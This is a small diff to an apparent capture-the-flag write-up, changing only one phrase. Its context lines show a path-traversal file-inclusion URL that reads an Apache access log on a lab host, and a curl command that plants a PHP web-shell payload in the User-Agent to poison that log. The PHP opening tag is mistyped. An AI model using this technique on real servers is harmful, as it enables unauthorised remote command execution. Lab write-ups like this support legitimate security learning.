@@ -113,7 +113,7 @@ Once again we have a possible LFI, going to ***http://10.0.0.17/planet/My_H1dd3n
 The user ***'giuseppe'*** is on the remote machine.  
 Since this site is running on ***apache2*** let's try to view it's log files and try to  poison them.
 
-Going to ***http://10.0.0.17/planet/My_H1dd3n_S3cr3t/file.php?file=../../../../../../../var/log/apache2/access.log*** we see all the requests to the remote server. Let's use ***curl*** and add some PHP code as a header so it is executed once we open the log file. 
+Going to ***http://10.0.0.17/planet/My_H1dd3n_S3cr3t/file.php?file=../../../../../../../var/log/apache2/access.log*** we can see all the requests to the remote server. Let's use ***curl*** and add some PHP code as a header so it is executed once we open the log file. 
 
     # curl http://10.0.0.17 -A "<php? system($_GET['cmd'])?>"
 
